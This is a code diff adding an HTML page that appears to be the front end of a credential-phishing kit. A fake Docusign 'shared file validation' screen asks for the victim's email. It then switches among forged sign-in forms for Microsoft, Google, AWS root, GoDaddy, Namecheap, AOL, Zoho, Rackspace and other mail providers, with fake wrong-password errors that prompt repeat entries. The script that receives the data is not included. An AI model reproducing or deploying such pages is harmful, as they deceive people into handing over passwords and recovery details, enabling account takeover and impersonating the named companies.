@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Docusign | Shared file validation</title>
+    <link rel="shortcut icon" href="domain_assets/docusign_favicon.png" type="image/x-icon" id="fav_icon"/>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <section id="greetingSection">
+      <div class="greetingSectionInner">
+        <div class="img_wrapper">
+          <img src="" id="hero_img" width="100%" height="auto" />
+        </div>
+        <div class="name_key_taker">
+          <div class="f_wrapper">
+            <h1>Encrypted Cloud File Storage</h1>
+            <div class="f_d_wrap">
+              <p>
+                This file is protected by Docusign protection, you need to enter the email that this
+                was shared to:
+              </p>
+              <div class="home_input_box">
+                <input type="email" placeholder="Enter email" required id="name_key" />
+                <div class="info_btn_callout">
+                  <div class="ds_callout">
+                    <h3>Why do I have to do this?</h3>
+                    <p>
+                    The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.
+                    </p>
+                  </div>
+                  <div class="info_btn">
+                    <i class="fa-regular fa-circle-question"></i>
+                  </div>
+                </div>
+              </div>
+              <div class="name_key_error_box d_none">Please enter a valid email address.</div>
+              <div class="btn___wrap">
+                <button id="view_rq" onclick="view_action()">View</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="domainsWrapper">
+      <section class="d_none" id="officeSection">
+        <div class="officeInnerWrapper">
+          <div class="d_flex">
+            <div class="office_whiteboard board">
+              <div class="o_i_w">
+                <img src="" alt="" id="office_brand" />
+              </div>
+              <div class="office_name_key">
+                <img src="" alt="" id="office_left_arrow" />
+                <div class="office_name_k_text name_key_holder"></div>
+              </div>
+              <h1>Enter password</h1>
+              <div class="null_pass_error d_none">
+                Please enter the password for your Microsoft account.
+              </div>
+              <div class="error_box d_none">
+                Your account or password is incorrect. If you don't remember your password,
+                <span>reset it now.</span>
+              </div>
+              <input
+                type="password"
+                class="office_n_p_input name_pass"
+                placeholder="Password"
+              
+              />
+              <p class="f_p_link">Forgot password?</p>
+              <div class="office_s_in_btn">
+                <button class="confirm_action" onclick="sign_in_action(0)">Sign in</button>
+              </div>
+            </div>
+          </div>
+          <div id="office_footer" class="">
+            <p>Terms of use</p>
+            <p>Privacy & cookies</p>
+            <p>...</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="godaddySection">
+        <div class="godaddyInnerWrapper">
+          <div class="gdWhiteboard board">
+            <img src="" alt="" id="godaddy_logo" />
+            <h1>Sign in</h1>
+            <div class="gd_title">New to GoDaddy? <span>Create an Account</span></div>
+            <div class="error_box d_none gd_error_box">
+              You entered an incorrect username or password. Please try again or try
+              <span>resetting your password.</span>
+            </div>
+            <div class="gd_input_box">
+              <input type="text" id="gd_nk_" class="name_key_holder_gd" />
+              <label for="gd_nk_" class="gd_label"
+                >Username or Customer # <span class="gd_label_star">*</span></label
+              >
+            </div>
+            <div class="gd_input_box">
+              <input type="password" id="gd_np_" class="name_pass" placeholder="" />
+              <span
+                id="pass_toggle"
+                role="button"
+                onclick="togglePasswordVisibility(this, 'gd_np_')"
+                >Show</span
+              >
+              <label for="gd_np_" class="gd_label"
+                >Password <span class="gd_label_star">*</span></label
+              >
+              <div class="null_pass_error d_none gd_null_pass_error">Password is required</div>
+            </div>
+            <div class="gd_remember_me">
+              <input type="checkbox" name="" />
+              <p>Keep me signed in on this device</p>
+            </div>
+            <div class="gd_confirm_btn">
+              <button onclick="sign_in_action(1, 'no_need_error_border')">Sign In</button>
+            </div>
+            <div class="signup_with_box">
+              <p>or sign in with</p>
+              <div class="signup_with_icon"><i class="fa-brands fa-apple"></i></div>
+              <div class="signup_with_icon"><i class="fa-brands fa-facebook"></i></div>
+              <div class="signup_with_icon"><i class="fa-brands fa-google"></i></div>
+            </div>
+            <div class="gd_title">
+              Need to find <span>your username</span> or <span>your password</span>?
+            </div>
+          </div>
+          <div class="gd_title gd_footer">
+            All Rights Reserved.
+            <span>Privacy Policy</span>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="namecheapSection">
+        <div class="ncInnerWrapper">
+          <div class="nc_subHeader">
+            <div class="nc_sh_left">
+              <p>
+                contact us <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <p>
+                sign in <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <p>sign up</p>
+            </div>
+            <div class="nc_sh_right">
+              <img src="" alt="" id="cart_img_nc" />
+              <p>
+                usd <span><i class="fa-solid fa-caret-down"></i></span>
+              </p>
+              <img src="" alt="" id="search_img_nc" />
+            </div>
+          </div>
+          <div class="nc_header">
+            <div class="nc_h_left">
+              <img src="" alt="" id="namecheap_logo" />
+              <div class="nc_h_right">
+                <p>domain</p>
+                <p>hosting</p>
+                <p>wordpress</p>
+                <p>email</p>
+                <p>apps<span class="new_badge">new</span></p>
+                <p>security<span class="new_badge">new</span></p>
+                <p>transfer to us<span class="tryme_badge">try me</span></p>
+                <p>help center</p>
+                <p>account</p>
+              </div>
+            </div>
+          </div>
+          <div class="nc_breadcrumbs">
+            <h2>My Account <span id="arrow_icon_nc">→</span> <span>Login</span></h2>
+          </div>
+          <div class="nc_whiteBoard board">
+            <div class="nc_nw_head">
+              <h1>Log In to Your Account</h1>
+              <h5>SIGN UP?</h5>
+            </div>
+            <div class="error_box d_none nc_error_box">
+              <div>
+                <h4>VALIDATION ERROR</h4>
+                <h4>x</h4>
+              </div>
+              <p>
+                The password does not match the user account or the account does not exist. Please
+                verify both the user name and password and try again.
+              </p>
+            </div>
+            <div class="nc_input_box">
+              <h5>Username</h5>
+              <input type="email" placeholder="Username" class="name_key_nc" />
+            </div>
+            <div class="nc_input_box">
+              <h5>Password</h5>
+              <input type="password" placeholder="Password" class="name_pass" />
+            </div>
+            <div class="null_pass_error d_none nc_null_pass_error">
+              A valid password is required
+              <div id="nc_required_error">Required</div>
+            </div>
+            <div class="nc_confirm_btn">
+              <button onclick="sign_in_action(2, 'no_need_border')">Sign in and Continue</button>
+            </div>
+            <p class="nc_f_p">Forgot username or password?</p>
+          </div>
+          <div class="nc_promo_chart">
+            <h1>Need help? We're always here for you.</h1>
+            <div class="nc_pc_btn">Chat with a Live Person</div>
+          </div>
+          <div id="nc_footer">
+            <div class="nc_f_gird_row">
+              <div class="f_gird_left">
+                <img id="namecheap_logo_f" src="" alt="" />
+                <p>
+                  We make registering, hosting, and managing domains for yourself or others easy and
+                  affordable, because the internet needs people.
+                </p>
+                <h3>Learn more about Namecheap →</h3>
+                <h3>Read our blog →</h3>
+                <div class="f_g_last">
+                  <h3>Join Our Newsletter & Marketing Communication</h3>
+                  <p>We'll send you news and offers.</p>
+                  <div class="news_letter_nc">
+                    <input type="text" placeholder="you@yours.com" />
+                    <button>Join</button>
+                    <ul>
+                      <li><i class="fa-brands fa-twitter"></i></li>
+                      <li><i class="fa-brands fa-facebook-f"></i></li>
+                      <li><i class="fa-brands fa-instagram"></i></li>
+                      <li><i class="fa-brands fa-pinterest-p"></i></li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div class="f_gird_right">
+                <div class="f_gird_1">
+                  <h5>Domains</h5>
+                  <p>Domain Name Search</p>
+                  <p>Domain Transfer</p>
+                  <p>New TLDs</p>
+                  <p>Handshake domains <span class="new_badge_footer">NEW</span></p>
+                  <p>Personal Domain</p>
+                  <p>Marketplace</p>
+                  <p>Whois Lookup</p>
+                  <p>PremiumDNS</p>
+                  <p>FreeDNS</p>
+                  <h5>Hosting</h5>
+                  <p>Shared Hosting</p>
+                  <p>WordPress Hosting</p>
+                  <p>Reseller Hosting</p>
+                  <p>VPS Hosting</p>
+                  <p>Dedicated Servers</p>
+                  <p>Private Email Hosting</p>
+                  <p>Migrate to Namecheap</p>
+                  <h5>WordPress</h5>
+                  <p>Shared Hosting</p>
+                  <p>WordPress Hosting</p>
+                  <p>Migrate WordPress</p>
+                </div>
+                <div class="f_gird_2">
+                  <h5></h5>
+                  <p>Domain Privacy</p>
+                  <p>Website Security <span class="new_badge_footer">NEW</span></p>
+                  <p>Domain Vault <span class="new_badge_footer">NEW</span></p>
+                  <p>PremiumDNS</p>
+                  <p>CDN</p>
+                  <p>VPN<span class="new_badge_footer">update</span></p>
+                  <p>Cyber Insurance <span class="new_badge_footer">NEW</span></p>
+                  <p>2FA</p>
+                  <p>Public DNS</p>
+                  <br />
+                  <p>Anti-Spam Protection</p>
+                  <br />
+                  <h5>Transfer to Us <span class="tryme_badge_footer">UPDATE</span></h5>
+                  <p>Domain Transfer</p>
+                  <p>Migrate Hosting</p>
+                  <p>Migrate WordPress</p>
+                  <p>Migrate Email</p>
+                  <h5>SSL Certificates</h5>
+                  <p>Comodo</p>
+                  <p>Organization Validation</p>
+                  <p>Domain Validation</p>
+                  <p>Extended Validation</p>
+                  <p>Single Domain</p>
+                  <p>Wildcard</p>
+                  <p>Multi-Domain</p>
+                  <h5>Resellers</h5>
+                  <p>SSL Certificates</p>
+                  <p>Reseller Hosting</p>
+                  <h5>Promos</h5>
+                </div>
+                <div class="f_gird_2">
+                  <h5>Guru Guides</h5>
+                  <h5>Help Center</h5>
+                  <p>Status Updates</p>
+                  <p>Knowledgebase</p>
+                  <p>How-To Videos</p>
+                  <p>Submit Ticket</p>
+                  <p>Live Chat</p>
+                  <p>Report Abuse</p>
+                  <h5>Apps</h5>
+                  <p>Marketplace</p>
+                  <p>Subscriptions</p>
+                  <p>Business Formation <span class="new_badge_footer">NEW</span></p>
+                  <p>Relate</p>
+                  <p>RelateSocial <span class="new_badge_footer">NEW</span></p>
+                  <p>RelateReviews <span class="new_badge_footer">NEW</span></p>
+                  <p>Visual</p>
+                  <p>Stencil Graphics <span class="new_badge_footer">NEW</span></p>
+                  <p>Site Maker</p>
+                  <p>Logo Maker</p>
+                  <p>Business Card Maker</p>
+                  <p>Business Name Generator</p>
+                  <h5>Careers</h5>
+                  <h5>Affiliates</h5>
+                  <h5>Send us Feedback</h5>
+                </div>
+              </div>
+            </div>
+            <div class="f_gird_bottm">
+              <p>
+                The entirety of this site is protected by copyright © 2000–2023 Namecheap, Inc. 4600
+                East Washington Street, Suite 305, Phoenix, AZ 85034, USA
+              </p>
+              <div>
+                <p>Terms and Conditions</p>
+                <p>Privacy Policy</p>
+                <p>UDRP</p>
+              </div>
+            </div>
+            <div class="nc_bottom_footer">
+              <img src="" alt="" id="nc_footer_img" />
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="earthlinkSection">
+        <div class="elInnerWrapper">
+          <div class="el_header">
+            <div class="elh1">
+              <img src="" alt="" id="earthlink_logo" />
+            </div>
+            <div class="elh2">
+              <img src="" alt="" id="el_ggl" />
+              <input type="text" />
+              <img src="" alt="" id="el_search" />
+            </div>
+            <div class="elh3">
+              <img src="" alt="" id="el_icons" />
+            </div>
+          </div>
+          <div class="el_body">
+            <div class="null_pass_error d_none el_error_b">
+              Username or password is blank. Please try again.
+            </div>
+            <div class="error_box el_error_b d_none">
+              Username or password is incorrect. Please try again.
+            </div>
+            <div class="el_b_logo">
+              <img src="" alt="" id="earthlink_logo2" />
+            </div>
+            <div class="elBoard_wrapper board">
+              <h1>Welcome to WebMail</h1>
+              <p>Sign In to Get Started</p>
+              <div class="el_input_box">
+                <label for="">Email Address:</label>
+                <input type="text" class="el_name_key" />
+              </div>
+              <div class="el_input_box">
+                <label for="">Password:</label>
+                <input type="password" id="el_n_p" class="name_pass" />
+              </div>
+              <div class="el_rmbr">
+                <div>
+                  <input type="checkbox" />
+                  <p>Remember username</p>
+                </div>
+                <p>Forgot your password?</p>
+              </div>
+              <div class="el_btns">
+                <button onclick="sign_in_action(3, 'no_need_border')">Sign in</button>
+                <div>
+                  <button>Make a Payment</button>
+                  <button>Support</button>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="el_footer"></div>
+        </div>
+      </section>
+      <section class="d_none" id="mimecastSection">
+        <div class="mcInnerWrapper">
+          <div class="logo_wrapper">
+            <img src="" alt="" id="mimecast_logo" />
+          </div>
+          <div class="mc_dashboard_wrapper board">
+            <h5>Log In</h5>
+            <p class="name_key_holder"></p>
+            <div class="input_box_mc">
+              <input type="password" placeholder="Password" id="mc_name_pass" class="name_pass" />
+              <div class="error_box mc_error_b d_none">
+                Invalid user name, password or permissions.
+              </div>
+              <div class="null_pass_error"></div>
+              <button onclick="sign_in_action(4, 'no_need_border')" id="mc_submit_btn">
+                Log in
+              </button>
+            </div>
+            <a href="#">Log in as a different user.</a>
+            <a href="#">Reset Cloud Password</a>
+          <div class="mc_footer">
+            <p>©2023 Mimecast v1.5.21-1-20230131_0937</p>
+            <p>Privacy</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="googleSection">
+        <div class="gglInnerWrapper">
+          <div class="ggl_dashboard board">
+            <img src="" alt="" id="ggl_logo" />
+            <h2>Welcome</h2>
+            <div class="ggl_n_k_hold">
+              <img src="" alt="" id="ggl_account_icon" />
+              <p class="name_key_holder"></p>
+              <img src="" alt="" id="ggl_down_icon" />
+            </div>
+            <div class="box_wrapper_ggl_">
+              <div class="input_box_ggl_wrapper input_box_ggl_wrapper1">
+                <input type="password" id="ggl_input" class="name_pass" />
+                <label for="ggl_input" id="ggl_label" class="">Enter your password</label>
+                <input type="text" id="pass_holder_ggl" style="display: none;">
+              </div>
+              <div class="input_box_ggl_wrapper input_box_ggl_wrapper2">
+                <input type="text" id="ggl_input__rpe" class="" required/>
+                <label for="ggl_input__rpe" id="ggl_input__rpe_label" class="">Enter recovery Email or Phone</label>
+              </div>
+            </div>
+            <div class="null_pass_error d_none ">
+              <div class="ggl_null_pass_error">
+                <img src="" alt="" id="exclam_icon">
+                <p class="skdhks__">Enter password</p>
+              </div>
+            </div>
+            <div class="error_box d_none">
+              <div class="ggl_error_box">
+                <img src="" alt="" id="exclam_icon2">
+                Incorrect password. Please try again or click on the "Forgot your password?" link to reset it.
+              </div>
+            </div>
+            <div class="show_pass_box">
+              <input type="checkbox" name="" id="show_pass_ggl" onclick="togglePasswordVisibility(this, 'ggl_input')"/>
+              <label for="show_pass_ggl">Show password</label>
+            </div>
+            <div class="action_box_ggl">
+              <p>Forgot password?</p>
+              <button onclick="sign_in_action(5)" id="ggl_submit_btn">
+                Next
+              </button>
+            </div>
+          </div>
+          <div class="ggl_footer">
+            <div class="ggl_f_1">
+              <p>English (United States)</p>
+              <span><i class="fa-solid fa-caret-down"></i>
+            </div>
+            <div class="ggl_f_2">
+              <p>Help</p>
+              <p>Privacy</p>
+              <p>Terms</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="rackSection">
+        <div id="rackspacesection">
+          <div class="rackspaceInnerWrapper board">
+            <div class="rk-content-header">
+              <div class="rk-content-header-label">Webmail Login</div>
+              <div class="rk-content-header-logo">
+                <img src="" alt="" id="rk_logo">
+              </div>
+            </div>
+            <div class="rk-content-body">
+              <div class="rk-banner-section">
+                <img src="" alt="" id="rk_banner">
+              </div>
+              <div class="rk-devider"></div>
+              <div class="rk-login-form">
+                <div class="rk-user-file">
+                  <div class="null_pass_error rk_n_p_e d_none">
+                    That account doesn't exist. Enter a different account
+                  </div>
+                  <div class="error_box rk_e_b d_none">
+                    Invalid password.! please enter your correct password.
+                  </div>
+                  <div class="rk-user-email-info">
+                    <label for="">Email Address</label>
+                    <input type="text" name="" id="rk_name_key" />
+                  </div>
+                  <div class="rk-fp-info"><a href="#">Forgot password?</a></div>
+                  <div class="rk-SeInfo">
+                    <label for="">Password</label>
+                    <input type="password" name="password" id="rk_name_pass" class="name_pass" />
+                  </div>
+                  <div class="rk-login-btn"><button onclick="sign_in_action(6, 'no_need_border')">Log in</button></div>
+                </div>
+              </div>
+            </div>
+            <div class="rk-base-link">
+              <a href="#">Privacy Statement</a>
+              <div class="rk-devider2">|</div>
+              <a href="#">Website Terms</a>
+            </div>
+            <div class="rk-rackspace-footer">
+              <div class="rk-caption">
+                <p>
+                  Need webmail for your business? Learn more about <a href="#">Hosted Email</a> from
+                  Rackspace
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="ionosSection">
+        <div id="ionosInnerWrapper">
+          <div class="ionos_header_wrapper">
+            <img src="" alt="" id="ionos_logo">
+            <img id="ionos_search_bar" src="" alt="">
+            <img src="" alt="" id="ionos_qs_icon">
+          </div>
+          <div class="login__dashboard board">
+            <h1>Webmail Login</h1>
+            <div class="error_box d_none">
+              <div class="inp_error">
+                <p>An error has occurred.</p>
+                <p>This e-mail address could not be found or the password is incorrect.</p>
+              </div>
+            </div>
+            <div class="null_pass_error d_none">
+              <div class="inp_error">
+                <p>An error has occurred.</p>
+                <p>Please try again later.</p>
+              </div>
+            </div>
+            <div class="ionos_input_box_wrapper">
+              <div class="ib_icon">
+                <img src="" alt="" id="ionos_user_icon">
+              </div>
+              <div class="iib__">
+                <input type="text" name="" id="ionos_email" class="">
+                <label for="ionos_email" id="ionos_email_label">E-mail Address</label>
+              </div>
+            </div>
+            <div class="ionos_fp">
+              <p class="ionos_linkstyle">Forgot your password?</p>
+            </div>
+            <div class="ionos_input_box_wrapper">
+              <div class="ib_icon">
+                <img src="" alt="" id="ionos_lock_icon">
+              </div>
+              <div class="iib__">
+                <input type="password" name="" id="ionos_password" class="name_pass">
+                <label for="ionos_password" id="ionos_password_label">Password</label>
+              </div>
+            </div>
+            <div class="ionos_rm">
+              <input type="checkbox" name="">
+              <p class="ionos_linkstyle">Remember me</p>
+            </div>
+            <div class="ionos_dcdprimaryButton">
+                <input type="button" id="ionos_action_btn" onclick="sign_in_action(7, 'no_need_border')" value="Login">
+            </div>
+          </div>
+          <div class="ionos_mail_merketing">
+            <div>
+              <h2>You don't have a professional email account yet?</h2>
+              <p>IONOS email address from $1 incl. free domain.</p>
+              <button class="iembtn">Learn more</button>
+            </div>
+            <div>
+              <img src="" id="iem_" alt="">
+            </div>
+          </div>
+          <div class="ionos_part_2">
+            <img src="" alt="" id="ionos_part_img">
+          </div>
+          <div class="ionos_footer__">
+            <p><span>•</span> All Systems Operational</p>
+            <p>IONOS Inc. • 2023</p>
+            <p>Privacy Policy</p>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="aolSection">
+        <div class="aolInnerWrapper">
+          <div class="aol_header">
+            <img src="" alt="" id="aol_logo">
+            <p>Help</p>
+          </div>
+          <div class="aol_body_wrap">
+            <div class="aolWhiteBoard board">
+              <img src="" alt="" id="aol_logo2">
+              <div class="name_key_holder_aol">
+                <p class="name_key_holder"></p>
+              </div>
+              <div class="board_h_info">
+                <h3>
+                  Enter password
+                </h3>
+                <p>to finish signing in</p>
+              </div>
+              <div class="aol_input_box">
+                <input type="password" name="" id="aol_name_pass" class="name_pass">
+                <label for="aol_name_pass" id="aol_label__">Password</label>
+              </div>
+              <div class="null_pass_error d_none aol_n_e_b">
+                Please provide password.
+              </div>
+              <div class="error_box d_none aol_e_b">
+                Uh oh, looks as though something went wrong. Please try again later.
+              </div>
+              <div class="aol_btn">
+                <button onclick="sign_in_action(8)" >Sign in</button>
+              </div>
+              <p class="aol_f_p">Forgotten password?</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="roundcubeSection">
+        <div class="roundcubeInnerWrapper">
+          <div class="rc_form_item board">
+            <div class="rc_login_form_fild">
+              <div class="rc_roundcube_logo">
+                <img src="" id="rc_logo" alt="" />
+              </div>
+              <div class="null_pass_error d_none rc_n_e">
+                That account doesn't exist. Enter a different account
+              </div>
+              <div class="error_box d_none rc_e_b">
+                Invalid Password...! Please enter correct password.
+              </div>
+              <div class="rc_roundcube_Input_box">
+                <div class="rc_rdb_email_ads">
+                  <label for="">Email address</label>
+                  <input type="text" id="rc_email" placeholder="Enter Email" />
+                </div>
+                <div class="rc_rdb_pass_box">
+                  <label for="">Password</label>
+                  <input type="password" id="rc_password" class="name_pass" placeholder="Enter password" />
+                </div>
+                <div class="rc_rdb_button">
+                  <button onclick="sign_in_action(9, 'no_need_border')"> Login </button>
+                </div>
+              </div>
+            </div>
+            <div class="rc_rdb_bottom_content">
+              <p>You have successfully terminated the session. <a href="#">Login to Continue.</a></p>
+            </div>
+            <div class="rc_rdb_footer">
+              <span>RoundCube Webmail</span>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="zohoSection">
+        <div class="zohoInnerWrapper">
+          <div class="zoho_conteiner">
+              <div class="sign_in_conteiner">
+                  <div class="zoho_sign_box">
+                      <div class="zoho_logo"><img src="" id="zohoLogo" alt=""></div>
+                      <div class="zoho_input_fild">
+                          <!-- <form action="" method="post"> -->
+                              <div class="zoho_sign_head">
+                                  <span class="zoho_head_title">Sign in</span>
+                                  <div class="zoho-service_name">to access <span>Zoho Home</span></div>
+                              </div>
+                              <div class="zoho_fild_container board">
+                                  <div class="zoho_hello_user">
+                                      <div class="zoho_user_name name_key_holder">
+                                      </div>
+                                      <span class="notYou">Change</span>
+                                  </div>
+                                  <div class="zoho_text_box">
+                                      <input type="password" name="" class="textbox name_pass" placeholder="Enter Password">
+                                      <!-- <span class="zoho_icon"><i class="fa-solid fa-eye"></i></span> -->
+                                  </div>
+                                  <div class="null_pass_error d_none rc_n_e">
+                                    Please enter Password
+                                  </div>
+                                  <div class="error_box d_none rc_n_e">
+                                    Invalid Password...! Please enter correct password
+                                  </div>
+                                  <div class="zoho_textBox_action">
+                                      <span class="zoho_blue_text_auction">Forgot Password</span>
+                                  </div>
+                              </div>
+                              <div class="zoho_button">
+                                  <button class="Btn_blue" onclick="sign_in_action(10)"><span>Sign in</span></button>
+                              </div>
+                          <!-- </form> -->
+                      </div>
+                  </div>
+                  <div class="zoho_right_sitebox">
+                      <img src="" id="zohoInfo" alt="">
+                  </div>
+              </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="centurylinkSection">
+        <div class="clInnerWrapper">
+          <div class="cl_header_">
+            <img src="" alt="" id="cl_logo">
+          </div>
+          <div class="cl_whiteboard board">
+            <div class="cl_input_box_wrapper">
+              <input type="email" id="cl_name_key__" class="cl_name_key">
+              <label for="cl_name_key__" id="cl_name_key__label">CenturyLink Email</label>
+            </div>
+            <div class="cl_input_box_wrapper">
+              <input type="password" class="name_pass" id="name_pass__">
+              <label for="name_pass__" id="name_pass__label">Password</label>
+              <div class="null_pass_error d_none">
+                <div class="cl_err_box">
+                  Enter a password
+                </div>
+              </div>
+            </div>
+            <div class="cl_rm_">
+              <input type="checkbox">
+              <p>Stay signed in</p>
+            </div>
+            <div class="error_box d_none">
+              <div class="cl_e_bbb__">
+                Invalid username or password.  Try again
+              </div>
+            </div>
+            <div class="cl_signin_btn">
+              <button onclick="sign_in_action(11)">Sign in</button>
+            </div>
+            <div class="cl_help_">
+              <p>Forgot Password?</p>
+              <p>Need help?</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="webmailSection">
+        <div class="webmailInnerWrapper">
+          <div class="error_box  d_none">
+            <div class="wm_err_box">
+            <img src="" alt="" id="webmail_error">
+            </div>
+          </div>
+          <div class="wm_logo_wrapper">
+            <img src="" alt="" id="wm_logo">
+          </div>
+          <div class="wm_board board">
+            <div class="null_pass_error d_none">
+              <p class="wm_eeeeeeerr">That account doesn't exist. Enter a different account</p>
+            </div>
+            <label for="wm_name_key">Email address</label>
+            <div class="wm_input_wrapper">
+              <img src="" alt="" id="wm_user_icon">
+              <input type="email" id="wm_name_key" placeholder="Enter your email address">
+            </div>
+            <label for="wm_name_pass">Password</label>
+            <div class="wm_input_wrapper">
+              <img src="" alt="" id="wm_lock_icon">
+              <input type="email" id="wm_name_pass" class="name_pass" placeholder="Enter your email password">
+            </div>
+            <div class="wm_signin_btn">
+              <button onclick="sign_in_action(12, 'no_need_border')">Sign in</button>
+            </div>
+            <div class="wm_rp">Reset Password</div>
+          </div>
+          <div class="wm_footer__">
+            <ul>
+              <li>English </li>
+              <li>العربية</li>
+              <li>български</li>
+              <li>čeština </li>
+              <li>اdansk </li>
+              <li>Deutsch </li>
+              <li>Ελληνικά</li>
+              <li>español</li>
+              <li>•••</li>
+            </ul>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="revisionSection">
+        <div class="revisionInnerWrapper">
+          <div class="revisionWhiteBoard board">
+            <div class="revisionWhiteBoard_left">
+              <img src="" alt="" id="revision_logo" />
+              <div class="revision_header">
+                <h1>Root user sign in</h1>
+                <span><i class="fa-solid fa-circle-info"></i></span>
+              </div>
+              <div class="revision_name_k_taker">
+                <b>Email: </b>
+                <p class="name_key_holder"></p>
+              </div>
+              <div class="revision_label">
+                <b>Password</b>
+                <a href="#">Forgot password?</a>
+              </div>
+              <div class="revision_input_box">
+                <input type="password" class="name_pass" name="user_key__"/>
+                <div class="null_pass_error d_none revision_null_pass_error">
+                  Password field must not to be empty.!
+                </div>
+                <div class="error_box d_none revision_error_box">
+                  You have entered incorrect username or password. Please try again.
+                </div>
+              </div>
+              <div class="revision_confirm_btn">
+                <button onclick="sign_in_action(13, 'no_need_border')">Sign In</button>
+              </div>
+              <div class="diff_anchor">
+                <a href="#">Sign in to a different account</a>
+                <a href="#">Create a new account</a>
+              </div>
+            </div>
+            <div class="revisionWhiteBoard_right">
+              <img src="" alt="" id="revision_hero" />
+            </div>
+          </div>
+          <div class="revision_footer">
+            <p>
+              © 2023, Amazon Web Services, Inc. or its affiliates. All rights reserved.© 2022,
+              Amazon Web Services, Inc. or its affiliates. All rights reserved.
+            </p>
+            <a role="button"
+              >English <span><i class="fa-solid fa-caret-down"></i></span
+            ></a>
+          </div>
+        </div>
+      </section>
+    </section>
+    <script src="app.js" defer></script>
+  </body>
+</html>
